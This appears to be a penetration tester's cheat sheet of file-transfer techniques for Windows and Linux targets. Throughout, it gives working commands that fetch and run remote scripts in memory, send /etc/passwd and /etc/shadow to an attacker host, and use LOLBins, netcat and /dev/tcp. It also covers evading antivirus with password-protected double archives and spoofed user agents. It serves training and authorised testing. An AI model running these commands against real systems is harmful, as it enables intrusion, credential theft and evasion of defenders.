# File Transfers — Windows & Linux

Always verify integrity: `md5sum <file>` (Linux) / `Get-FileHash <file> -Algorithm md5` (Windows). Match hashes before trusting transferred files.

LOLBAS (Windows): https://lolbas-project.github.io/ GTFOBins (Linux): https://gtfobins.github.io/

---

## Windows — Download to Target

**PowerShell Base64 (no network needed — small files only, cmd.exe limit 8191 chars):**

Encode on Linux:

```bash
cat <FILE> | base64 -w 0; echo
```

Decode on Windows:

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\<FILE>", [Convert]::FromBase64String("<B64>"))
```

**PowerShell WebClient (HTTP/HTTPS/FTP):**

```powershell
(New-Object Net.WebClient).DownloadFile('http://<LHOST>:8000/<FILE>','C:\Users\Public\<FILE>')
(New-Object Net.WebClient).DownloadFileAsync('http://<LHOST>:8000/<FILE>','C:\Users\Public\<FILE>')
```

**Fileless — exec in memory (no disk touch):**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>:8000/script.ps1')
(New-Object Net.WebClient).DownloadString('http://<LHOST>:8000/script.ps1') | IEX
```

**Invoke-WebRequest (PS3+, slower):**

```powershell
Invoke-WebRequest http://<LHOST>:8000/<FILE> -OutFile <FILE>
iwr http://<LHOST>:8000/<FILE> -OutFile <FILE>     # alias
```

Fix IE first-launch error: add `-UseBasicParsing` Fix SSL trust error:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

**SMB — Impacket server (attacker):**

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare                          # anon
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test  # authenticated
```

Download from SMB (Windows):

```cmd
copy \\<LHOST>\share\<FILE>

# If guest access blocked:
net use n: \\<LHOST>\share /user:test test
copy n:\<FILE>
```

**FTP — Python server (attacker):**

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21              # anon read
sudo python3 -m pyftpdlib --port 21 --write      # anon read+write
```

Download (Windows PowerShell):

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<LHOST>/file.txt', 'C:\Users\Public\file.txt')
```

FTP command file (non-interactive shell):

```cmd
echo open <LHOST> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET <FILE> >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

**WebDAV (SMB over HTTP — bypasses TCP/445 blocks):**

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

Connect (Windows):

```cmd
dir \\<LHOST>\DavWWWRoot
copy <FILE> \\<LHOST>\DavWWWRoot\
copy <FILE> \\<LHOST>\sharefolder\
```

`DavWWWRoot` = special keyword for WebDAV root. Use actual share path to avoid issues.

---

## Windows — Upload from Target

**PowerShell Base64 upload:**

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\file" -Encoding byte))
# catch with nc -lvnp 8000
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\file' -Encoding Byte))
Invoke-WebRequest -Uri http://<LHOST>:8000/ -Method POST -Body $b64
```

Decode on Linux:

```bash
echo <B64> | base64 -d -w 0 > <FILE>
```

**Python uploadserver:**

```bash
pip3 install uploadserver
python3 -m uploadserver            # HTTP on 8000
```

Upload with PSUpload.ps1:

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://.../PSUpload.ps1')
Invoke-FileUpload -Uri http://<LHOST>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

**FTP upload:**

```powershell
(New-Object Net.WebClient).UploadFile('ftp://<LHOST>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

FTP command file (non-interactive):

```cmd
echo open <LHOST> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

**PowerShell Remoting (WinRM TCP/5985) — host-to-host:**

```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
$Session = New-PSSession -ComputerName DATABASE01
Copy-Item -Path C:\file.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
Copy-Item -Path "C:\remote\file.txt" -Destination C:\ -FromSession $Session
```

---

## Linux — Download to Target

**wget / curl:**

```bash
wget http://<LHOST>:8000/<FILE> -O /tmp/<FILE>
curl -o /tmp/<FILE> http://<LHOST>:8000/<FILE>
```

**Fileless (pipe to shell):**

```bash
curl http://<LHOST>:8000/script.sh | bash
wget -qO- http://<LHOST>:8000/script.py | python3
```

**Base64 (no network):**

Encode on attacker:

```bash
cat <FILE> | base64 -w 0; echo
```

Decode on target:

```bash
echo -n '<B64>' | base64 -d > <FILE>
md5sum <FILE>
```

**Bash /dev/tcp (no wget/curl available):**

```bash
exec 3<>/dev/tcp/<LHOST>/80
echo -e "GET /<FILE> HTTP/1.1\n\n">&3
cat <&3
```

**SCP (SSH must be running on attacker):**

```bash
sudo systemctl start ssh
scp <USER>@<LHOST>:/root/<FILE> .
```

---

## Linux — Upload from Target

**curl to uploadserver (HTTPS):**

```bash
# Attacker: create cert + start server
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Target: upload
curl -X POST https://<LHOST>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

**Python one-liner upload:**

```bash
python3 -c 'import requests;requests.post("http://<LHOST>:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

**SCP upload:**

```bash
scp /etc/passwd <USER>@<TARGET>:/home/<USER>/
```

**Serve file from target (attacker pulls):**

```bash
python3 -m http.server 8000          # python3
python2.7 -m SimpleHTTPServer 8000   # python2
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p 8000
```

Attacker downloads:

```bash
wget http://<TARGET>:8000/<FILE>
```

---

## Netcat / Ncat File Transfer

**Attacker sends → target receives (target listens):**

```bash
# Target (listen)
nc -l -p 8000 > <FILE>
ncat -l -p 8000 --recv-only > <FILE>

# Attacker (send)
nc -q 0 <TARGET> 8000 < <FILE>
ncat --send-only <TARGET> 8000 < <FILE>
```

**Attacker listens → target connects (bypasses inbound firewall on target):**

```bash
# Attacker (listen + serve)
sudo nc -l -p 443 -q 0 < <FILE>
sudo ncat -l -p 443 --send-only < <FILE>

# Target (receive)
nc <LHOST> 443 > <FILE>
ncat <LHOST> 443 --recv-only > <FILE>
cat < /dev/tcp/<LHOST>/443 > <FILE>    # bash fallback (no nc)
```

---

## Nginx Upload Server (Catch via HTTP PUT)

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# /etc/nginx/sites-available/upload.conf:
server {
    listen 9001;
    location /SecretUploadDirectory/ {
        root /var/www/uploads;
        dav_methods PUT;
    }
}

sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service
```

Upload:

```bash
curl -T /etc/passwd http://<LHOST>:9001/SecretUploadDirectory/users.txt
```

---

## Language One-Liners

**Python download:**

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://<LHOST>:8000/<FILE>","<FILE>")'
python2.7 -c 'import urllib;urllib.urlretrieve("http://<LHOST>:8000/<FILE>","<FILE>")'
```

**PHP download:**

```bash
php -r '$file = file_get_contents("http://<LHOST>:8000/<FILE>"); file_put_contents("<FILE>",$file);'
php -r '$lines = @file("http://<LHOST>:8000/<FILE>"); foreach ($lines as $line) { echo $line; }' | bash
```

**Ruby:**

```bash
ruby -e 'require "net/http"; File.write("<FILE>", Net::HTTP.get(URI.parse("http://<LHOST>:8000/<FILE>")))'
```

**Perl:**

```bash
perl -e 'use LWP::Simple; getstore("http://<LHOST>:8000/<FILE>", "<FILE>");'
```

**JavaScript (Windows cscript.exe) — save as wget.js:**

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1; BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
cscript.exe /nologo wget.js http://<LHOST>:8000/<FILE> <FILE>
```

---

## LOLBAS / GTFOBins

**Bitsadmin (Windows):**

```cmd
bitsadmin /transfer wcb /priority foreground http://<LHOST>:8000/nc.exe C:\Temp\nc.exe
```

```powershell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://<LHOST>:8000/nc.exe" -Destination "C:\Temp\nc.exe"
```

**Certutil (Windows — AMSI-flagged on modern systems):**

```cmd
certutil.exe -verifyctl -split -f http://<LHOST>:8000/nc.exe
certutil -urlcache -split -f http://<LHOST>:8000/nc.exe
```

**CertReq (Windows — upload):**

```cmd
certreq.exe -Post -config http://<LHOST>:8000/ c:\windows\win.ini
# catch with nc -lvnp 8000
```

**OpenSSL (Linux — LOLBin transfer):**

```bash
# Attacker: create cert + serve
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/<FILE>

# Target: receive
openssl s_client -connect <LHOST>:80 -quiet > <FILE>
```

---

## Encryption Before Transfer

**Windows (Invoke-AESEncryption.ps1):**

```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt   # → .aes file
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt.aes
```

**Linux (OpenSSL AES-256):**

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

**Double-archive AV evasion (Linux → 0 detections):**

```bash
rar a test.rar -p payload.js    # password-protect
mv test.rar test                # remove extension
rar a test2.rar -p test         # archive again with password
mv test2.rar test2              # final file: 0/49 VT detections
```

---

## RDP File Transfer

```bash
# Mount local folder via RDP (Linux)
xfreerdp /v:<TARGET> /d:<DOMAIN> /u:<USER> /p:<PASS> /drive:linux,/home/user/files
rdesktop <TARGET> -d <DOMAIN> -u <USER> -p <PASS> -r disk:linux='/home/user/files'
```

Access via `\\tsclient\linux` inside RDP session.

---

## User Agent Evasion (Windows PowerShell)

```powershell
# List built-in user agents
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}}

# Use Chrome UA for download
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<LHOST>:8000/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

Detected UA strings (defenders should whitelist/blacklist these):

- `Invoke-WebRequest` → `WindowsPowerShell/5.1...`
- `Certutil` → `Microsoft-CryptoAPI/10.0`
- `BITS` → `Microsoft BITS/7.8`
- `WinHttp` → `WinHttp.WinHttpRequest.5`

> [!tip] Decision tree: SMB blocked? → WebDAV (port 80). FTP blocked? → HTTP/HTTPS (uploadserver). PowerShell blocked? → certutil / bitsadmin / LOLBAS. All outbound blocked except 443? → HTTPS uploadserver or reverse SMB via WebDAV.

> [!warning] Do NOT exfiltrate real PII/credit cards/secrets from client environments. Use dummy data to test DLP controls. Always encrypt sensitive files before transfer using AES-256 or similar.